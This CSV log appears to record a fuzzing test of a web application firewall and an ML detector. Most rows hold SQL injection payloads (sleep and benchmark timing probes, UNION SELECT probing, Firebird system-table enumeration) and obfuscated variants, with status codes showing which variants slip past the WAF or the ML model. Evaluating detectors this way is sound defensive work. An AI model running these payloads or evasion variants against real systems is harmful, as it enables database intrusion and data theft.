Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
1,2024-12-17T14:46:15.530164,"1""  )   as dezr where 2145  =  2145 or sleep  (  5  )  #",403,403,403,both_correct," and 1""  )   as dezr wHErE/**/(SeLeCT 2145)  =
 '>'<>'>:' OR sleep  (  5  )  #",2024-12-17T14:46:18.969629,403,200,waf_correct_ml_incorrect," AND 'Q' NOT LIKE 'QB'""  )   AS dezr wHeRe/*""l\fo*/(sELeCT (SELECT/**/1))   like 	 '>'<>'>:' OR sleep  (  0x5  )  #",2024-12-17T14:46:23.705709,403,403,both_correct," AND 'Q' NOT LIKE 'QB'""  )   AS dezr wHeRe/*""l\fo*/(sELEct (seleCT (sElect  OR 809 NOT LIKE 810)))   LIKe   '>'<>'>:' oR sleep  (  0x5  )  #du",2024-12-17T14:46:30.230181,403,403,both_correct," anD 'Q' NOT LIKE/**/'QB'""  )   AS dezr wHeRe/**/(SElECT (SelECt (SeLEcT  oR 'gQ*fu'!='gQ*fuN' NOT LIKE (SELECT 0x1))))   LIke  	'>' not like '>:' oR sleep  (  0x5  )  #duD
",2024-12-17T14:46:37.974484,403,403,both_correct," and 'Q' not like/*Gu*/'QB'""  )   AS dezr WhErE/**/(SeLeCt (selECT (SElecT  or 'gQ*fu'!='gQ*fuN' NOT LIKE (seLEct 0x1))))   lIKE  	'>' not like '>:' oR sleep  (  0x5  )/**/ #duD ",2024-12-17T14:46:47.420343,403,403,both_correct," And 'Q' not like/*Gu*/'QB'""  )   AS dezr WHERe/**/(seLECt (SElECT (sElECT  Or 'gQ*fu'!='gQ*fuN' not like (selEcT 0x1))))   Like  
'>' not like '>:' oR sleep  (  0x5  )/*du0*//**/#duD ",2024-12-17T14:46:56.841482,403,403,both_correct," and 'Q' not like/**/'QB'""  )   aS dezr WhErE/**/(sELEcT (sEleCT (SeLect  Or 'gQ*fu' not like 'gQ*fuN' not like (SelECt 0x1))))   LIKE  	'>' not like '>:' Or sleep  (  0x5  )/*O
Xg*/ #duD ",2024-12-17T14:47:06.831781,403,200,waf_correct_ml_incorrect," aND 'Q' not like/**/'QB'""  )   As dezr WhEre (SELECT (SELEct (seLEct  Or 'gQ*fu' not like 'gQ*fuN' not like (sELEcT 0x1))))   LikE  
'>' not like '>:' oR sleep  (  0x5  )/*O
Xg*/ #duD 4H",2024-12-17T14:47:16.869139,403,403,both_correct," ANd 'Q' not like/**/'QB'""  )   As dezr WhEre (SELECT (SELEct (seLEct  Or 'gQ*fu' not/*
I""UE*/LikE 'gQ*fuN' not like (seLEct 0x1))))   LIKe  
'>' not like '>:' or sleep  (  0x5  )/**/ #duD 4H",2024-12-17T14:47:26.764736,403,403,both_correct," and 'Q' not like/**/'QB'""  )   As dezr WhEre/*s(*/(SELECT (SELEct (seLEct  Or 'gQ*fu' not/*
I""UE*/Like 'gQ*fuN' not like (sELect 0x1))))   LIKE  
'>' not like '>:' or sleep  (  0x5	 )/**/ #duD 4H",2024-12-17T14:47:37.229293,403,200,waf_correct_ml_incorrect
2,2024-12-17T14:47:47.519109,47761an0i59r,200,200,200,both_correct,47761an0i59r,2024-12-17T14:47:48.216747,200,200,both_correct,47761an0i59r,2024-12-17T14:47:49.926547,200,200,both_correct,47761an0i59r,2024-12-17T14:47:51.664325,200,200,both_correct,47761an0i59r,2024-12-17T14:47:53.383940,200,200,both_correct,47761an0i59r,2024-12-17T14:47:55.107079,200,200,both_correct,47761an0i59r,2024-12-17T14:47:56.830898,200,200,both_correct,47761an0i59r,2024-12-17T14:47:58.543322,200,200,both_correct,47761an0i59r,2024-12-17T14:48:00.246157,200,200,both_correct,47761an0i59r,2024-12-17T14:48:01.923525,200,200,both_correct,47761an0i59r,2024-12-17T14:48:03.640982,200,200,both_correct
3,2024-12-17T14:48:05.345282,1  )   where 3381  =  3381,403,200,200,both_incorrect,(SELECT 1) 	)   whERE /**/Or 0   LIKE   7191 LIKE 7191,2024-12-17T14:48:06.907714,403,403,both_correct,"(SELEcT 4851!=4852) 
)   where  Or 0   LIkE   0x1c17 like  AND 1",2024-12-17T14:48:10.707948,403,403,both_correct,"(selEcT/**/'bx@' NOT LIKE 'bx@''!=4852) 
)   WhErE  OR  aND 1   lIKe   0x1c17 liKe 
ANd 0x1",2024-12-17T14:48:14.877323,403,200,waf_correct_ml_incorrect,"(seLeCt 'bx@'
NOT LIKE 'bx@''!=3670 not like (SelecT 1)) 
)   whERe  Or  aND 0x1   lIKE   0x1c17 LIkE 
ANd 0x1",2024-12-17T14:48:20.397162,403,200,waf_correct_ml_incorrect,"(selEcT 'bx@'
NOT LIKE 'bx@''!= AND (SELECT 1) not like (SelecT 'tB' LIKE 'tB')) 
) /**/ WhErE  or  anD 0x1   lIke   0x1c17 lIkE  AnD 0x1",2024-12-17T14:48:26.722238,403,403,both_correct,"(select 'bx@'
NOT LIKE 'bx@''!= AND (SELECT 0x1) not like (SelecT 'Qx`M' LIKE 'Qx`M')) 
)   where  or  anD	0x1   LiKE   0x1c17 LIkE  And 0x1",2024-12-17T14:48:34.370386,403,403,both_correct,"(sELEct 'bx@'
not like 'bx@''!= AND (SELECT 0x1) not like (SelecT 'Qx`M' LIKE 'Qx`M')) 
)  /**/whERe  Or  and	0x1
  LiKe   0x1c17 LiKe  ANd 0x1",2024-12-17T14:48:42.416114,403,403,both_correct,"(sELecT 'bx@'
not like 'bx@''!= AND (SELECT 0x1) not like (SelecT 'Qx`M' LIKE
'Qx`M')) 
)   WhERe  or  aNd	0x1
  Like   0x1c17 likE  anD 0x1",2024-12-17T14:48:50.273465,403,403,both_correct,"(SELecT 'bx@'
not like 'bx@''!=/**/AND (SELECT 0x1) not like (SelecT 'Qx`M' LIKE
'Qx`M')) 
)   Where  oR  ANd	0x1	  LiKE   0x1c17 LiKE  and 0x1",2024-12-17T14:48:57.971771,403,403,both_correct,"(SelECT 'bx@' not like 'bx@''!= AND (SELECT 0x1) not like (SelecT 'Qx`M' LIKE
'Qx`M')) 
)   WHEre  oR  aNd	0x1	  LikE   0x1c17 liKe  aNd 0x1",2024-12-17T14:49:06.080527,403,403,both_correct
4,2024-12-17T14:49:13.881276,valcourt,200,200,200,both_correct,valcourt,2024-12-17T14:49:14.423606,200,200,both_correct,valcourt,2024-12-17T14:49:15.947300,200,200,both_correct,valcourt,2024-12-17T14:49:17.463117,200,200,both_correct,valcourt,2024-12-17T14:49:18.971724,200,200,both_correct,valcourt,2024-12-17T14:49:20.484782,200,200,both_correct,valcourt,2024-12-17T14:49:22.011847,200,200,both_correct,valcourt,2024-12-17T14:49:23.517737,200,200,both_correct,valcourt,2024-12-17T14:49:25.060909,200,200,both_correct,valcourt,2024-12-17T14:49:26.577808,200,200,both_correct,valcourt,2024-12-17T14:49:28.096037,200,200,both_correct
5,2024-12-17T14:49:29.625566,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",403,403,200,waf_correct_ml_incorrect,"1' aND (SeLeCT 
And 7784<>7785)   like     (  selEct count  (  *  )   FRom rdb$fields aS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions/**/As t4  )  --",2024-12-17T14:49:35.784794,403,200,waf_correct_ml_incorrect,"'6' LIKE '(SELECT 1)'' aNd (SELeCT 
aND 7784 not like 0x1e69)   lIKe     (  seLECT count  (  *  )   fROm rdb$fields AS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )
 --",2024-12-17T14:49:44.645688,403,200,waf_correct_ml_incorrect,"' OR 0' liKe '(SELECT '&' NOT LIKE '&a')'' && (SELEcT  anD 0x1e68 not like 0x1e69)   LiKE/**/    (  SelEct count  (  *  )   fRom rdb$fields as t1,rdb$types aS t2,rdb$collations As t3,rdb$functions as t4  )
 --",2024-12-17T14:49:54.491301,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' Like '(SELECT '&' NOT LIKE '&a')''  AND  (SEleCT  ANd 0x1e68 not like 0x1e69)   lIKE     (  SeLect count  (  *  )   FRoM rdb$fields aS t1,rdb$types as t2,rdb$collations As t3,rdb$functions aS t4  )  --",2024-12-17T14:50:05.818094,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' lIKe '(SELECT '&' NOT LIKE '&a')''  &&  (Select  aND 0x1e68 not like 0x1e69)   LIKe     (  SeLECt count/**/ (  *  )   FroM rdb$fields
as t1,rdb$types as t2,rdb$collations As t3,rdb$functions AS t4  )  --",2024-12-17T14:50:17.524007,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' LIKe '(SELECT '&'
NOT LIKE '&a')''   and   (sELeCT  AnD 0x1e68 not like 0x1e69)   lIke     (  SeLEct count  (  *  )   from rdb$fields
As t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions as t4  )  --",2024-12-17T14:50:29.469581,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' LIkE '(SELECT/**/'&'
NOT LIKE '&a')''   AnD   (SElEcT  aNd 0x1e68 not like 0x1e69)   lIke     (  selECT count  (  *  )   from rdb$fields	as t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions as t4  )  --",2024-12-17T14:50:41.211149,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' lIke '(SELECT/*#^*/'&' NOT LIKE '&a')''/**/  anD   (SElEct  and 0x1e68 not like 0x1e69)   like     (  seLECt count  (  *  )   From rdb$fields	AS t1,rdb$types AS t2,rdb$collations as t3,rdb$functions As t4  )  --",2024-12-17T14:50:53.139253,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' LIKE/**/'(SELECT/*#^*/'&' NOT LIKE '&a')''/*nRA'(SelEcT  OR 0)*/  anD   (SELeCt  anD 0x1e68 not like 0x1e69)   Like     (  SElECT count  (  *  )
  FROM rdb$fields	As t1,rdb$types aS t2,rdb$collations As t3,rdb$functions aS t4  )  --",2024-12-17T14:51:05.502943,403,200,waf_correct_ml_incorrect,"' OR 'W<,!'<>'W<,!_'' LiKe/*JPXm*/'(SELECT/*#^*/'&' NOT LIKE
'&a')''/*nRA'(SeleCt  ||  or 0x0)*/  AND   (SeLEcT  ANd 0x1e68 not like 0x1e69)   lIke     (  SELeCT count  (  *  )
  frOm rdb$fields	aS t1,rdb$types as t2,rdb$collations AS t3,rdb$functions aS/**/t4  )  --",2024-12-17T14:51:18.529949,403,200,waf_correct_ml_incorrect
6,2024-12-17T14:51:32.268508,"1%""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",403,403,200,waf_correct_ml_incorrect,"'#' NOT LIKE '#t'%""   )    )    OR (SELeCt 8514)   like  
benchmark  (   Or 0,md5  (  0x544d5a4c /**/ )    )   #",2024-12-17T14:51:36.197066,403,403,both_correct,"'#' NOT/**/LIKE '#t'%""   )    )    oR (SelECT  And (SELECT 1))   LiKE   benchmark  (   or '<w'<>'<wA',md5  (  0x544d5a4c /*d[&$v*/ )    )   #",2024-12-17T14:51:42.530789,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/LIKE '#t'%""   )    )    or (SeLeCt  aNd (SELect  oR (selEct 6153 lIKe 6153)))   lIKe   benchmark  (   Or '<w' not like '<wA',md5  (
 0x544d5a4c   )    )   #",2024-12-17T14:51:50.687521,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/LIKE '#t'%""   )    )    Or (sElecT  ANd/**/(sElecT  OR (seLeCT  oR 'Nk' NOT LIKE 'NkT' liKe 0x1809)))   lIke   benchmark  (   Or '<w' not like '<wA',md5  (
 0x544d5a4c   )	   )   #i",2024-12-17T14:51:59.918722,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/lIke '#t'%""   )    )    or (SElEcT  AnD (seleCt  || (SeleCt  OR 'Nk' NOT LIKE 'NkT' liKE 0x1809)))   LiKe   benchmark  (   oR '<w' not like '<wA',md5  (
 0x544d5a4c   )    )   #i",2024-12-17T14:52:10.275317,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/likE '#t'%""   )    )    oR (SElECt  AnD (SeLect   or  (sELEcT  Or 'Nk' NOT LIKE 'NkT' LiKE 0x1809)))   liKE   benchmark/**/ (   Or '<w' not like '<wA',md5 	(
 0x544d5a4c   )    )   #i9Y",2024-12-17T14:52:20.690800,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/lIkE '#t'%""   )    )    oR (SeLeCT  AND (sELecT   ||  (sElECT  or 'Nk' NOT LIKE/**/'NkT' LiKE 0x1809)))   like   benchmark/**/ (   OR '<w' not like '<wA',md5  (
 0x544d5a4c   )    )   #i9Y",2024-12-17T14:52:31.091034,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/LIke '#t'%""   )    )    OR (SElECt  aNd (seLECT    or   (seLecT  OR 'Nk' NOT LIKE/**/'NkT' LIKE 0x1809)))
  liKE   benchmark/*}TDL*/ (   oR '<w' not like '<wA',md5  (
 0x544d5a4c /**/ )    )   #i9Y",2024-12-17T14:52:42.085269,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/Like '#t'%""   )    )    oR (SELecT  AnD (SElecT    OR  	(SElECT  Or 'Nk' not like 'NkT' LIkE 0x1809)))
  LIkE   benchmark/*}TDL*/ (   or '<w' not like '<wA',md5  (
 0x544d5a4c /*=*/ )    )   #i9Y",2024-12-17T14:52:53.205234,403,200,waf_correct_ml_incorrect,"'#' NOT/*bE|v*/lIke '#t'%""   )    )    or (SeLect  And (sELECT    Or   (SELECt  or 'Nk' not like 'NkT'/**/LIkE 0x1809)))
  liKe   benchmark/**/ (   oR '<w' not like '<wA',md5  (
 0x544d5a4c /*=*/ )    )   #i9Y~=",2024-12-17T14:53:04.432113,403,200,waf_correct_ml_incorrect
7,2024-12-17T14:53:15.450587,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",403,403,403,both_correct,"1'||  (  select 'jzwq' WHERe (sElEct 9407 NOT LIKE 9408)   LIKE   0xcd9 union all/**/SelEct	null,null,null,null,null,null,null#{",2024-12-17T14:53:20.059143,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 1217<> OR 0 not like 9408)   LiKe   0xcd9/*wlF*/union all/**/sElEcT null,null,null,null,null,null,null#{",2024-12-17T14:53:27.296116,403,403,both_correct,"0x1'||  (  select 'jzwq'/**/WHEre (sElecT 'Kn '<>'Kn	X'!= Or (SELECT 0) not like  ANd 1)   LikE   0xcd9/**/union all/**/SelECt null,null,null,null,null,null,null#{bu",2024-12-17T14:53:35.152585,403,403,both_correct,"0x1'||  (  select 'jzwq'/**/WHEre (sElecT 'Kn '<>'Kn X' not like  oR (SeLecT 0x0) not like/**/ aNd 469 IN ( OR 0,469,470))   lIkE   0xcd9/**/union all/**/SeLect null,null,null,null,null,null,null#{bua8",2024-12-17T14:53:43.962401,403,403,both_correct,"0x1'||  (  select
'jzwq'/**/WHEre (sElecT 'Kn '<>'Kn X' not like  || (seLeCt 0x0) not like/**/ AND  OR 0 IN ( Or 0,469,(sELect 380!=381)))   LIkE   0xcd9 union all/**/selEct null,null,null,null,null,null,null#{bua8Z",2024-12-17T14:53:54.781660,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 'Kn '<>'Kn X' not like   or  (SElect 0x0) not like/**/ and  oR (SELECT 1) In ( or 0,469,(selECt (SElEct 869<>870)!=381)))   LIkE   0xcd9 union all/*gaas*/SeLEcT null,null,null,null,null,null,null#{bua8Z",2024-12-17T14:54:06.126272,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 'Kn '<>'Kn X' not like   or  (SEleCt 0x0) not like/*.*/ And  OR (SElEct 1) IN ( OR (SELECT 'w'='w'),469,(SelEct (SELect 869<>(SELECT 870)) NOT LIKE 381)))   liKe   0xcd9 union all	sElECT null,null,null,null,null,null,null#{bua8Z",2024-12-17T14:54:18.731210,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 'Kn '<>'Kn X'/**/not like   or  (SEleCt 0x0) not like/**/ And  OR (SElEct 1) IN ( OR (SELECT 'w'='w'),469,(seLect (SelecT (SeLEcT 3720) like 3720<>(SELECT  Or 0)) not like 381)))   Like   0xcd9 union all SeLECt null,null,null,null,null,null,null#{bua8Z",2024-12-17T14:54:32.366898,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 'Kn '<>'Kn X' not like   or  (SEleCt 0x0) not like/**/ And  OR (SElEct 1) IN ( OR (SELECT 'w'='w'),469,(seLect (SelecT (SeLEcT 'g' NOT LIKE 'g;') lIkE (SELECT 3720)!=(SElECt 	OR (SELECT 1))) not like 381)))   LIke   0xcd9 union all selECT null,null,null,null,null,null,null#{bua8Z",2024-12-17T14:54:47.450596,403,403,both_correct,"0x1'||  (  select 'jzwq' WHEre (sElecT 'Kn '<>'Kn X' not like   or  (SEleCt 0x0) not like/**/ And  OR (SElEct /**/OR 5937<>0x1732) IN ( OR (SELECT 'w'='w'),469,(seLect (SelecT (SeLEcT
'g' NOT LIKE 'g;') LIKe (SeleCT 3720)<>(Select 	Or (sElect 1))) not like 381)))   like   0xcd9 union all SELECt null,null,null,null,null,null,null#{bua8Zr",2024-12-17T14:55:03.484676,403,403,both_correct
8,2024-12-17T14:55:20.832541,1'   )    )     )   and 6991  =  5579,403,403,200,waf_correct_ml_incorrect,"1'   )    )     )   and  AND/**/')k'!=')ko'
  like   (SELECT 5579)",2024-12-17T14:55:22.684676,200,403,waf_incorrect_ml_correct, and 0x1'   )    )     )/*a$ttd*/  and  AND/**/')k'!=')ko'	  liKe   (SELecT 'B#Ca'='B#Ca'),2024-12-17T14:55:26.920984,200,200,both_incorrect, and 0x1'   )    )     )/**/ 	and  AND ')k'!=')ko'	  liKE   (selEct  AND (SELECT 1) NOT LIKE 7833),2024-12-17T14:55:32.308569,200,403,waf_incorrect_ml_correct," and 0x1'  
)    )     )/*)4FW*/ 	and  AND ')k'!=')ko'	 /**/lIKE   (sELecT  anD (selECT (SELECT 5915)=(SELECT 1)) NOT LIKE 7833)",2024-12-17T14:55:38.257726,200,403,waf_incorrect_ml_correct," And 0x1'  
)    )     )/*)4FW*/ 
and  AND ')k'!=')ko'	  LIKe   (sELECT  AnD (SeLEcT (sELEct (SeLeCT  AND 1))=(SElEcT 1)) not like 947 LIkE 947)",2024-12-17T14:55:45.288321,200,403,waf_incorrect_ml_correct," ANd 0x1'/*]*/ 
)    )     )/*)4FW*/  and  AND ')k'!=')ko'	  LiKe   (SeLEcT  AND (seLeCt (seLeCT (sEleCt  AND 1)) LIKE (SELEct 2079<>2080)) not like  aNd (sELecT 1) lIkE 947)",2024-12-17T14:55:53.102326,403,403,both_correct, And 0x1'   )    )     )/*)4FW*/  and  AND ')k'!=')ko'	  Like   (SELect  anD (Select (SEleCt (sElECt  ANd 0x1)) LIKe (sEleCt 1360<>1361<>2080)) not like  aNd (sElect 1) LiKe  OR 0),2024-12-17T14:56:02.667724,403,403,both_correct, ANd 0x1'   )    )     )/*)4FW*/  and  AND ')k'!=')ko'	  liKE   (SeLeCT  anD (sELEcT (selECt (SEleCt/**/ aNd 0x1)) lIKe (SELEcT 0x550<>1361<>(sELeCt 1)))	not like  aNd (SELECT '8e' LIKE '8e') liKE  or 0),2024-12-17T14:56:12.282242,403,403,both_correct, And 0x1'   )    )     )/*)4FW*/  and  AND ')k'!=')ko'   liKE   (SeLeCT  anD (sELEcT (selECt (SEleCt  aNd 0x1)) lIKe (SELEcT 0x550<>(SELECT '%TpW'<>'%TpWB')<>(sELeCt (SELECT 1))))	not like  aNd (SELECT '8e' LIKE '8e') lIke  Or 0),2024-12-17T14:56:22.869593,403,403,both_correct," ANd 0x1'   )    )     )/*)4FW*/  and  AND ')k'!=')ko'   liKE   (SeLeCT  anD (sELEcT (selECt (SEleCt  aNd 0x1)) lIKe (SELEcT 0x550<>(SELECT '%TpW'<>'%TpWB')<>(sELeCt (SELECT ' aNd 1' NOT LIKE '9h'))))	not like  aNd/**/(SELECT '8e' LIKE '8e') LikE
 oR 0x0)",2024-12-17T14:56:34.882620,403,403,both_correct
9,2024-12-17T14:56:47.880736,duchement tenza,200,200,200,both_correct,duchement/**/tenza,2024-12-17T14:56:48.764545,200,200,both_correct,duchement	tenza,2024-12-17T14:56:50.713554,200,200,both_correct,"duchement
tenza",2024-12-17T14:56:52.569052,200,200,both_correct,duchement tenza,2024-12-17T14:56:54.567552,200,200,both_correct,duchement/**/tenza,2024-12-17T14:56:56.470255,200,200,both_correct,duchement tenza,2024-12-17T14:56:58.442363,200,200,both_correct,duchement/*{*/tenza,2024-12-17T14:57:00.281306,200,200,both_correct,duchement	tenza,2024-12-17T14:57:02.306834,200,200,both_correct,"duchement
tenza",2024-12-17T14:57:04.137756,200,200,both_correct,duchement	tenza,2024-12-17T14:57:05.975964,200,200,both_correct
10,2024-12-17T14:57:07.804065,1%'   )    )     )   or sleep  (  5  )  #,403,403,200,waf_correct_ml_incorrect,"/**/And 1%'
  )    )     )   or sleep  (  (SELECT 'c' LIKE 'c')  )  #""*",2024-12-17T14:57:09.859618,403,403,both_correct,"/**/ANd  OR 0=0x394%'
  )    )     ) 
 or sleep  (  (SELECT 'c'/**/LIKE 'c')  )  #""*",2024-12-17T14:57:14.305843,403,403,both_correct,"/*#$4C*/and  OR (SELECT (SELECT 56!=57)) like 0x394%'
 /**/)    )     ) 
 or sleep  (  (SELECT 'c'/**/LIKE
'c')  )  #""*",2024-12-17T14:57:19.473461,403,403,both_correct,"/*#$4C*/aNd  oR (SELecT (SelECT 9994 liKE 9994!=(sELEct 0x1))) LikE 0x394%'
  )	   )     ) 
 or sleep  (  (SELECT 'c'/**/LIKE
'c')  )  #""*;",2024-12-17T14:57:26.234579,403,200,waf_correct_ml_incorrect,"/**/and  OR (sElect (sELEct  OR 'xX' LIKE 'xX' LIkE (SELECT 9994)<>(Select 0x1))) LIKe 0x394%'
  )
   )     ) 
 or sleep  (  (SELECT 'c' LIKE
'c')  )  #""*;-&",2024-12-17T14:57:34.270632,403,403,both_correct,"/*	?*/And
 || (SelECt (SEleCt  or 'xX' Like 'xX' Like (SeleCt  Or 0<>0x20b5)<>(seLeCT 0x1))) lIke 0x394%'
  )
   )   /**/ ) 
 or sleep  (  (SELECT 'c' LIKE
'c')  )  #""*;-&",2024-12-17T14:57:42.774503,403,200,waf_correct_ml_incorrect,"/*	?*/ANd
 || (selEcT (seLeCt  or 'xX' LIKe 'xX' LiKe (sELeCT  OR (selEcT  OR 6116 NOT LIKE 6117)<>0x20b5)<>(SELECT 0x1))) lIke 0x394%'
  )
   )   /**/ )   or sleep  (  (SELECT 'c'/**/LIKE
'c')  )  #""*;-&mB",2024-12-17T14:57:51.869108,403,403,both_correct,"/*o
*/AND

 OR  (seleCt (SELeCT  Or 'xX' lIKE 'xX' LIke (SELECt  OR (SeLect/**/ or (SELECT 6116) NOT LIKE  OR 'G'='G')<>0x20b5)<>(SELecT 0x1))) lIkE 0x394%'
  )
   )   /**/ )   or sleep  (  (SELECT 'c'/**/LIKE
'c')  )  #""*;-&mB",2024-12-17T14:58:02.955668,403,403,both_correct,"/*o
*/AnD

 OR  (SELECT/**/(SELect  or 'xX' LIke 'xX' LIke (sElEct  or (SELEcT/**/ oR (SELeCT (SElecT  or 5602 NOT LIKE 5603)) NOT LIKE  Or 'G'='G')<>0x20b5)<>(SEleCT 0x1))) LIke 0x394%'
  )
   )   /**/ )   or sleep  (  (SELECT 'c'/**/LIKE	'c')  )  #""*;-&mB.N",2024-12-17T14:58:14.628649,403,403,both_correct,"/*}/h.*/aNd

 ||  (seLEcT (selECT
 oR 'xX' LiKE 'xX' likE (SElEcT  OR (SeLeCt/**/ Or (SElEcT (sEleCT  OR 0x15e2 NOT LIKE  oR 4858 LikE 4858)) NOT LIKE  OR 'G'='G')<>0x20b5)<>(SeLEct 0x1))) lIkE 0x394%'
  )
   )   /**/ )   or sleep  (  (SELECT 'c'/**/LIKE	'c')  )  #""*;-&mB.N",2024-12-17T14:58:28.203457,403,403,both_correct
